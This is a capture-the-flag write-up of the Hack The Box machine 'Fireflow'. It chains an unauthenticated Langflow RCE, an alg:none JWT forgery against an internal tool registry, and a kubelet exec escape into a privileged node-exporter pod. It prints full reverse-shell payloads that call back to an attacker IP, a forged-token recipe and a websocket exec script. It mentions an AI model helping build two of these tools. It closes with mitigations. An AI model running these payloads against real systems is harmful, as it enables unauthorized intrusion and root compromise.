---
title: "Fireflow"
date: 2026-09-26
os: Linux
difficulty: Medium
tags: [langflow, unauthenticated-rce, jwt-alg-none, kubernetes, kubelet, privilege-escalation]
summary: "Unauthenticated RCE in a Langflow-based AI agent, a JWT alg:none bypass against an internal MCP Tool Registry, and a kubelet exec breakout to root via a privileged node-exporter pod."
platform: HTB
---

[Fireflow](https://app.hackthebox.com/machines/Fireflow?tab=play_machine)

## Machine Information

| | |
|---|---|
| **Name** | Fireflow |
| **Difficulty** | Medium |
| **OS** | Linux |

This box ended up being a three-stage chain: an unauthenticated RCE in a Langflow-based AI agent platform, a JWT signature bypass against an internal "MCP Tool Registry," and finally a Kubernetes kubelet abuse to break straight out to the host as root. Classic case of one sloppy web app bug snowballing once you start pivoting between internal services that all trust each other a little too much.

---

## Mapping the Box

First move, always: ping it and make sure there's actually something to attack before burning time on anything fancier.

![](/assets/machines/fireflow/pasted-image-20260925205919.png)

Connectivity confirmed, so next up was a full TCP sweep to see what was actually exposed:

```bash
nmap -p- --open -Pn -n --min-rate=5000 fireflow.htb -oN ports
```

![](/assets/machines/fireflow/pasted-image-20260925210600.png)

Only two ports open: 22 (SSH) and 443 (HTTPS). Small attack surface, which usually means the web app is where the real action is. I ran a version/script scan against just those two to get a better read on what I was dealing with:

```bash
nmap -p22,443 -sCV --min-rate=5000 -Pn -n fireflow.htb -oG AllInfo
```

![](/assets/machines/fireflow/pasted-image-20260925211211.png)

SSH is OpenSSH 9.6p1 on Ubuntu, up to date — nothing jumping out there. Port 443 is Nginx with a self-signed cert, and the cert is actually the interesting part: the Subject Alternative Name lists `*.fireflow.htb`, a wildcard. That's basically a neon sign saying "there are subdomains you haven't found yet."

I threw `whatweb` at the main site to squeeze out a bit more fingerprinting:

```bash
whatweb https://fireflow.htb/
```

![](/assets/machines/fireflow/pasted-image-20260925211744.png)

Confirmed Nginx again, but more usefully it leaked an `X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb` header — there's the second vhost, `flow.fireflow.htb`. Added it to `/etc/hosts`, browsed over, and found the main site had a button linking out to an AI agent. That redirected me to `flow.fireflow.htb/playground/<uuid>`, which opened a fresh chat session.

![](/assets/machines/fireflow/pasted-image-20260925212208.png)

![](/assets/machines/fireflow/pasted-image-20260925212851.png)

The landing page called this the "Nightfall AI Agent," built on a "Flow engine" at version 1.8.2, with a public playground sitting at flow ID `7d84d636-af65-42e4-ac38-26e867052c25`. That version number alone was worth searching on — and it turned out "Flow engine" is just the operator's internal name for **Langflow**.

---

## Turning a Public Flow Into a Shell

A quick search turned up a public writeup/PoC for an unauthenticated RCE sitting in Langflow's public flow-building endpoint. Exactly what I wanted to see.

![](/assets/machines/fireflow/pasted-image-20260925212956.png)

The root cause, straight from the advisory:

> The `POST /api/v1/build_public_tmp/{flow_id}/flow` endpoint allows building public flows without requiring authentication. When the optional `data` parameter is supplied, the endpoint uses attacker-controlled flow data (containing arbitrary Python code in node definitions) instead of the stored flow data from the database. This code is passed to `exec()` with zero sandboxing, resulting in unauthenticated remote code execution.

In plain terms: the endpoint is *supposed* to be public, so visitors can run pre-approved public flows without logging in. The problem is it never checks whether the `data` you send in the request body actually matches what's stored for that flow ID. Send your own `data`, and the server happily builds and executes *your* flow instead — and "building" a flow here just means `exec()`-ing whatever Python sits in a node's `code` field, completely unsandboxed. The advisory even calls this out as distinct from CVE-2025-3248, which only patched `/api/v1/validate/code` — the `build_public_tmp` path was apparently just never touched.

![](/assets/machines/fireflow/pasted-image-20260925213347.png)

Only prerequisite here is a valid flow UUID, and I already had one from the playground URL I'd been redirected to (`7d84d636-af65-42e4-ac38-26e867052c25`). I adapted the PoC into a reverse shell payload: a single malicious `genericNode` whose `code` field imports `os` and fires off a bash reverse shell before defining the dummy component the endpoint expects to find.

```bash
curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  --data-binary @- <<'JSON'
{
  "data": {
    "nodes": [
      {
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x": 0, "y": 0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.158/4444 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name = \"X\"\n    outputs = [Output(display_name=\"O\", name=\"o\", method=\"r\")]\n    def r(self) -> Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [
              {
                "types": ["Data"],
                "selected": "Data",
                "name": "o",
                "display_name": "O",
                "method": "r",
                "value": "__UNDEFINED__",
                "cache": true,
                "allows_loop": false,
                "tool_mode": false,
                "hidden": null,
                "required_inputs": null,
                "group_outputs": false
              }
            ],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }
    ],
    "edges": []
  }
}
JSON
```

Fired it off with a listener already running, and a shell landed basically instantly:

```bash
penelope -p 4444
```

![](/assets/machines/fireflow/pasted-image-20260925220209.png)

`www-data`, dropped straight into `/var/lib/langflow`:

![](/assets/machines/fireflow/pasted-image-20260925220348.png)

---

## From www-data to nightfall (via a Reused Password)

With a foothold as `www-data`, the obvious next move was going hunting for credentials in config files — self-hosted app deployments love to leave the superuser password and secret key sitting in a plaintext `.env` right next to the app config. Langflow's docs point at a few standard locations for that file, and `/etc/langflow/.env` was one of them:

![](/assets/machines/fireflow/pasted-image-20260925220817.png)

```bash
cat /etc/langflow/.env
```

![](/assets/machines/fireflow/pasted-image-20260925220927.png)

And there it was: the Langflow superuser password, `n1ghtm4r3_b4_n1ghtf4ll`. The app's own superuser account is called `langflow`, but there's no matching Linux user — checking `/etc/passwd` instead turned up a local user called `nightfall`, which tracks with the AI agent's own "Nightfall" branding. People reuse passwords across the app layer and the OS layer way more often than they should, so trying it felt like a safe bet:

![](/assets/machines/fireflow/pasted-image-20260925221258.png)

```bash
su nightfall
```

![](/assets/machines/fireflow/pasted-image-20260925221346.png)

And it worked — the app's superuser password had been recycled as `nightfall`'s actual system password. User flag, right there:

![](/assets/machines/fireflow/pasted-image-20260925221513.png)

![](/assets/machines/fireflow/pasted-image-20260925221550.png)

---

## A Hidden .mcp Folder, and a Second Set of Credentials

Poking around `nightfall`'s home directory, I spotted an odd hidden folder: `.mcp`.

![](/assets/machines/fireflow/pasted-image-20260925221819.png)

```bash
cat ~/.mcp/config.json
```

Inside was a config pointing at an internal service on port 30080, plus a second set of credentials:

```json
{
  "server": "http://10.129.107.225:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

Queried the version endpoint to see what this thing actually was:

```bash
curl -s http://127.0.0.1:30080/api/v1/version | jq
```

![](/assets/machines/fireflow/pasted-image-20260925222017.png)

It called itself an "MCP AI Tool Registry" (v0.1.0) — an internal service for registering and invoking tools the AI agent can call. More interesting than the name, though: the auth block in that same response told me exactly what I needed. It issues JWTs, and it lists both `HS256` **and** `none` as supported signing algorithms. That's a detail that should never make it to production — `alg: none` means the server will accept a token with an empty signature as valid, because somewhere in its JWT config nobody bothered to restrict the acceptable algorithm set.

First I authenticated normally with the leaked creds, just to see what a legit token looked like:

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' | jq
```

![](/assets/machines/fireflow/pasted-image-20260925222456.png)

Got back a normal, signed `langflow-bot` token — useful, but not an admin role. Instead of wasting time trying to crack the HS256 secret, I went straight for the `alg: none` weakness: crafted my own header and payload, set the role to `admin`, base64url-encoded both, and left the signature segment empty.

```bash
header=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
payload=$(printf '{"sub":"langflow-bot","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '=')
forged="$header.$payload."
echo "$forged"
```

![](/assets/machines/fireflow/pasted-image-20260925222803.png)

(I had Claude help me put this together quickly, since I'd never hand-forged a `none`-alg JWT before — turns out it's a two-line base64 job once you know the format: header, payload, and a trailing dot with nothing after it for the empty signature.)

Threw the forged token at the authenticated tools listing endpoint, and it worked — the server accepted a self-signed, unsigned token like it had actually verified something:

```bash
curl -s http://127.0.0.1:30080/api/v1/tools -H "Authorization: Bearer $forged" | jq
```

![](/assets/machines/fireflow/pasted-image-20260925223007.png)

Admin-scoped token in hand, the obvious next move was registering a new tool — the service's own `openapi.json` happily documents its API for anyone who asks:

```bash
curl -s http://127.0.0.1:30080/openapi.json -H "Authorization: Bearer $forged" | jq '.paths."/api/v1/tools".post'
```

![](/assets/machines/fireflow/pasted-image-20260925223449.png)

```bash
curl -s http://127.0.0.1:30080/openapi.json -H "Authorization: Bearer $forged" | jq '.components.schemas.ToolRegisterRequest'
```

![](/assets/machines/fireflow/pasted-image-20260925223559.png)

The `ToolRegisterRequest` schema takes a `name`, `description`, and a `code` field — and given what I'd already seen in Langflow itself, I had a strong suspicion `code` would get executed the exact same way: unsandboxed. Registered a tool that ran `id` via `os.system()`:

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
  -H "Authorization: Bearer $forged" -H "Content-Type: application/json" \
  -d '{"name":"pwnd2","description":"HACK","code":"import os; os.system(\"id\")"}' | jq
```

Registered fine, but calling it failed:

```bash
curl -s -X POST http://127.0.0.1:30080/mcp \
  -H "Authorization: Bearer $forged" -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"pwnd2","arguments":{}}}' | jq
```

![](/assets/machines/fireflow/pasted-image-20260925224258.png)

Came back with a traceback: `TypeError: expected str, bytes or os.PathLike object, not builtin_function_or_method`. Whatever the tool runner does internally with that `code` string, it doesn't like a bare `os.system()` call returning `None` with nothing capturable — the runtime clearly wants the tool to hand back a string. Swapped to `os.popen(...).read()`, which returns the command output as actual text, and that fixed it immediately:

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
  -H "Authorization: Bearer $forged" -H "Content-Type: application/json" \
  -d '{"name":"pwnd","description":"HACK","code":"import os; print(os.popen(\"id\").read())"}' | jq

curl -s -X POST http://127.0.0.1:30080/mcp \
  -H "Authorization: Bearer $forged" -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"pwnd","arguments":{}}}' | jq
```

![](/assets/machines/fireflow/pasted-image-20260925224554.png)

`uid=1000(mcp) gid=1000(mcp)` — code execution confirmed inside the MCP service. From there I registered one more tool, this time a proper reverse shell (built with revshells.com's Python payload), so I could get an interactive session instead of one-shot commands:

![](/assets/machines/fireflow/pasted-image-20260925225714.png)

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/tools -H "Authorization: Bearer $forged" -H "Content-Type: application/json" -d '{
"name":"revshell",
"description":"pwnd",
"code":"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.158\",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"}' | jq
```

![](/assets/machines/fireflow/pasted-image-20260925225820.png)

![](/assets/machines/fireflow/pasted-image-20260925225833.png)

Invoking that tool through `/mcp` dropped me into an interactive shell as `mcp` — on what turned out to be a completely different host from the main Fireflow box. This service runs in its own container.

---

## Breaking Out to the Node Through the Kubelet API

Looking around the new shell, it was pretty obvious I'd landed inside a Kubernetes pod rather than a plain VM: there's a `/var/run/secrets/kubernetes.io/serviceaccount` directory sitting there with a service account token, namespace file, and CA cert — the standard mount every pod gets.

![](/assets/machines/fireflow/pasted-image-20260925234519.png)

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

Got stuck here for a while, honestly, and ended up checking the official writeup just to get my bearings back. The piece I was missing: a pod's service account token isn't just for talking to the Kubernetes API server — it's also a valid bearer token against the **kubelet's own HTTPS API** on port 10250, directly on the node. Depending on how the cluster's RBAC is set up, that kubelet API can let you list and `exec` into *any* pod scheduled on that node, not just your own, which completely sidesteps the namespace-scoped limits you'd expect your service account to have.

Queried the kubelet's `/pods` endpoint with the stolen token to see everything running on the node, specifically hunting for anything privileged or sitting on a sensitive hostPath mount:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "https://10.129.107.225:10250/pods" \
  | python3 -c "import sys,json;d=json.load(sys.stdin);[print(i['metadata']['namespace'],i['metadata']['name'],c['name'],'priv=',c.get('securityContext',{}).get('privileged'),[v['hostPath']['path'] for v in i['spec'].get('volumes',[]) if 'hostPath' in v]) for i in d['items'] for c in i['spec']['containers']]"
```

![](/assets/machines/fireflow/pasted-image-20260926000841.png)

One pod jumped straight out: `prometheus-prometheus-node-exporter-nmntq` in the `monitoring` namespace, running `privileged=True` with hostPath mounts of `/proc`, `/sys`, and — the important one — `/`. Node-exporter legitimately needs host-level access to report system metrics, but mounting the *entire* host root filesystem into a privileged container means anyone who can exec into that pod effectively has root on the node, since the host's `/` ends up reachable somewhere inside the container.

Hitting the kubelet's `/exec` endpoint directly means a WebSocket connection with the `v4.channel.k8s.io` subprotocol instead of a plain HTTP call, so I had Claude help me put together a small script to drive that:

```python
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets
NODE = "10.129.107.225"
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'
async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    args = "&".join(f"command={p}" for p in cmd_parts)
    url = f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}?output=1&error=1&{args}"
    async with websockets.connect(url, ssl=ctx, additional_headers={"Authorization": f"Bearer {TOKEN}"}, subprotocols=["v4.channel.k8s.io"], open_timeout=10) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace")); sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass
asyncio.run(ws_exec(COMMAND.split()))
```

```bash
python3 /tmp/kube_exec.py "id"
```

![](/assets/machines/fireflow/pasted-image-20260926001739.png)

`uid=0(root)` — the service account from the low-privilege `mcp` pod had just enough kubelet-level access to exec straight into a privileged pod running as root on the node. From there, the host's root filesystem was reachable through the hostPath mount, so I poked around in it and grabbed the root flag.

![](/assets/machines/fireflow/pasted-image-20260926114721.png)

Machine pwned.

---

## Flags

- **User:** read from `/home/nightfall/user.txt` after escalating `www-data` → `nightfall` via the reused `.env` password.
- **Root:** read from the host filesystem, reached by exec'ing into the privileged `node-exporter` pod through the kubelet API.

---

## Lessons Learned / Mitigation

A few things stacked up here, and any one of them being fixed would have broken the chain:

- **The `build_public_tmp` endpoint trusted client-supplied flow data instead of the stored, vetted flow.** Public/unauthenticated endpoints should never execute attacker-controlled code — if the feature is "run this pre-approved public flow," the server must ignore any `data` the client tries to pass and always use what's in the database.
- **Secrets in `.env` were reused as real system account passwords.** The Langflow superuser password and the `nightfall` Linux user's password were identical. Application secrets and OS credentials should never share a value — a leak in one layer shouldn't automatically compromise the other.
- **The MCP Tool Registry advertised and accepted `alg: none` JWTs.** This is a textbook JWT misconfiguration: the signing algorithm must be pinned server-side and enforced on verification, never trusted from the token header itself. `none` should never appear in a production `supported_algorithms` list.
- **An internal admin API let any authenticated user register arbitrary executable "tools."** Registering a tool was equivalent to uploading a webshell. Tool code execution like this needs to run in an actual sandbox (container, gVisor, restricted interpreter — something), not a bare `exec`/`os.popen` in the service's own process.
- **A pod's Kubernetes service account token could authenticate directly to the kubelet API and exec into pods outside its own scope**, and a monitoring pod (node-exporter) was both privileged and had the entire host filesystem mounted in. Kubelet authorization should be locked down (disable anonymous/over-broad auth, scope what service accounts can reach on :10250), and `hostPath: /` on a privileged container is about as close to "please give me the node" as a Kubernetes manifest can get — it should never be necessary, even for a metrics exporter.
